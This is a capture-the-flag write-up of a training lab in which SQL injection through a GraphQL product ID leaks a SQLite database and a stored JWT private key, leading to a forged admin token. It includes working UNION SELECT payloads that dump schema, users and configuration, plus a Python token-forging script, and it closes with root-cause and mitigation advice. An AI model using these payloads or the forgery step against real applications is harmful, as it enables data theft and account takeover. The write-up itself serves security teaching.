---
title: "GraphQL SQL Injection to JWT Admin Forgery | SweetCore"
date: 2026-06-13 14:30:00 +0530
categories: [A05 - Injection, SQL Injection]
tags: [graphql, sql-injection, sqlite, jwt, privilege-escalation, webverselabs-pro, ctf]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/sweetcore-graphql-sqli-jwt-forgery.webp
  alt: "SweetCore GraphQL SQL Injection to JWT Admin Forgery"
---

## Lab Link

Lab: [SweetCore](https://dashboard.webverselabs-pro.com/mystery-challenges/sweetcore)

## Overview

SweetCore exposed product data through a GraphQL endpoint. While the GraphQL schema itself appeared normal, the `product(id: $id)` resolver passed the `id` variable into a backend SQL query unsafely.

By injecting into the GraphQL variable value, I was able to enumerate the SQLite schema, read application configuration values, extract JWT signing configuration, forge an administrator JWT, and access the application as the admin user.

This writeup documents the vulnerability chain in a defensive and educational format. Live hostnames, cookies, private keys, generated tokens, and the final flag are intentionally redacted.

## Objective

Gain administrative access to the SweetCore application and retrieve the challenge flag.

## Vulnerability Identification

```text
OWASP Top 10:2025
└── A05 - Injection
    └── SQL Injection
        └── GraphQL resolver accepts unsanitized ID input
            └── UNION-based SQLite extraction
                └── app_config disclosure
                    └── JWT private key exposure
                        └── Admin JWT forgery
```

The core issue was SQL injection inside a GraphQL resolver. The secondary impact was cryptographic trust failure because a JWT private key was stored in a database table reachable through the injection.

## Reconnaissance

After logging in as a normal customer account, the application used a cookie named `sc_token`.

The product page sent GraphQL requests to `/graphql`:

```http
POST /graphql HTTP/2
Host: <LAB_HOST>
Cookie: sc_token=<CUSTOMER_JWT>
Content-Type: application/json

{
  "query": "query Product($id: ID!) { product(id: $id) { id name description price variety image_url } }",
  "variables": {
    "id": "5"
  },
  "operationName": "Product"
}
```

The important observation was that the product identifier was supplied as a GraphQL variable:

```json
{
  "variables": {
    "id": "5"
  }
}
```

This meant the test point was not the GraphQL query syntax itself, but the value passed into the resolver.

## Exploitation

### 1. Confirming UNION-Based SQL Injection

The product resolver returned fields shaped like this:

```graphql
id
name
description
price
variety
image_url
```

That response shape made it possible to use a `UNION SELECT` with six columns and map extracted data into visible product fields.

A payload was placed inside the `id` variable:

```json
{
  "id": "-1' UNION SELECT '999','tables',group_concat(name, ', '),0,'schema','/x.jpg' FROM sqlite_master WHERE type='table'-- "
}
```

The response confirmed access to SQLite metadata:

```json
{
  "data": {
    "product": {
      "id": "999",
      "name": "tables",
      "description": "products, users, sqlite_sequence, app_config",
      "price": 0,
      "variety": "schema",
      "image_url": "/x.jpg"
    }
  }
}
```

At this point, the backend database structure was exposed through the GraphQL product lookup.

### 2. Enumerating the Users Table

Next, I queried the `users` table structure using SQLite table metadata:

```json
{
  "id": "-1' UNION SELECT '999','users_columns',group_concat(name, ', '),0,'schema','/x.jpg' FROM pragma_table_info('users')-- "
}
```

The response showed the relevant columns:

```json
{
  "description": "id, username, email, password_hash, role"
}
```

This confirmed that the application stored user roles in the database and likely trusted the role claim in the JWT for authorization.

### 3. Dumping User Records

Using the discovered column names, I extracted user information:

```json
{
  "id": "-1' UNION SELECT '999','users_dump',group_concat(id || '|' || username || '|' || email || '|' || password_hash || '|' || role, ' || ' ),0,'dump','/x.jpg' FROM users-- "
}
```

The response revealed multiple users, including an administrator account:

```text
1|orchard_admin|admin@sweetcore.test|<BCRYPT_HASH_REDACTED>|admin
2|maria_t|maria@example.com|<BCRYPT_HASH_REDACTED>|customer
3|dlong|dlong@example.com|<BCRYPT_HASH_REDACTED>|customer
4|sweet_tooth_sam|sam@example.com|<BCRYPT_HASH_REDACTED>|customer
5|kelvin|<EMAIL_REDACTED>|<BCRYPT_HASH_REDACTED>|customer
```

The administrator user was:

```text
id: 1
username: orchard_admin
role: admin
```

### 4. Extracting Application Configuration

The database also contained an `app_config` table. I queried it using the same UNION technique:

```json
{
  "id": "-1' UNION SELECT '999','app_config',group_concat(key || '=' || value, '\n'),0,'config','/x.jpg' FROM app_config-- "
}
```

The response disclosed sensitive JWT configuration:

```text
jwt_private_key=<RSA_PRIVATE_KEY_REDACTED>
jwt_alg=RS256
```

The presence of the private signing key in a database table was critical. Since the application used RS256, possession of the private key allowed signing a valid JWT that the server would trust.

### 5. Forging an Administrator JWT

Using the disclosed private key, I created a JWT for the administrator user discovered earlier.

The final script used the extracted key locally, but the key is redacted here:

```python
import time
import jwt

private_key = """<EXTRACTED_RSA_PRIVATE_KEY_REDACTED>"""

payload = {
    "sub": 1,
    "username": "orchard_admin",
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 7200
}

token = jwt.encode(payload, private_key, algorithm="RS256")
print(token)
```

This generated a new RS256-signed JWT containing the administrator identity and role:

```text
<FORGED_ADMIN_JWT_REDACTED>
```

### 6. Replacing the Session Cookie

I replaced the existing customer `sc_token` cookie in browser DevTools with the forged administrator JWT.

After refreshing the application, the session was accepted as:

```text
orchard_admin
role: admin
```

The admin-only area became accessible, and the challenge flag was displayed.

## Proof of Exploitation

Evidence of successful exploitation:

```text
GraphQL endpoint: /graphql
Injection point: variables.id
Database tables disclosed: products, users, sqlite_sequence, app_config
Admin user discovered: orchard_admin
JWT algorithm: RS256
Admin access achieved: yes
Flag retrieved: WEBVERSE{<REDACTED>}
```

The real customer token, private key, forged admin token, live hostname, and full flag are not included.

## Root Cause Analysis

The vulnerability chain existed because of multiple security failures:

1. The GraphQL resolver used untrusted input inside a SQL query without proper parameterization.
2. The application exposed database query results directly through normal product response fields.
3. Sensitive signing material was stored in the application database.
4. Authorization trusted JWT claims once the signature was valid.
5. The same SQL injection primitive allowed both data extraction and authentication bypass through token forgery.

The GraphQL layer did not create the vulnerability by itself. It acted as a transport layer to reach an unsafe SQL query inside the resolver.

## Impact

A successful attacker could:

- Enumerate database schema.
- Extract user records and password hashes.
- Read sensitive application configuration.
- Steal JWT signing material.
- Forge arbitrary trusted sessions.
- Escalate from customer to administrator.
- Access admin-only functionality and sensitive data.

This is a full application compromise because the attacker could mint valid tokens for privileged users.

## Mitigation

To prevent this class of issue:

- Use parameterized SQL queries or a safe ORM query builder.
- Treat GraphQL variables as untrusted input.
- Validate IDs using strict server-side type and format checks.
- Never store JWT private keys in application-accessible database tables.
- Store signing keys in a dedicated secrets manager or environment-protected secret store.
- Rotate JWT signing keys immediately after exposure.
- Avoid placing sensitive configuration in queryable tables.
- Enforce authorization checks server-side using trusted database state where appropriate.
- Add logging and alerting for suspicious GraphQL variable patterns such as SQL metacharacters and UNION queries.

## Real-World Insight

GraphQL does not automatically prevent injection vulnerabilities. Even when a schema defines a field as `ID!`, the backend resolver still decides how that value is used.

This lab is a strong example of how a single unsafe resolver can become a complete compromise when combined with poor secrets management. SQL injection exposed the database, the database exposed the JWT private key, and the private key allowed privilege escalation without needing to crack passwords.

The key lesson is that injection flaws and secret storage mistakes often multiply each other. Preventing either one would have broken the attack chain.
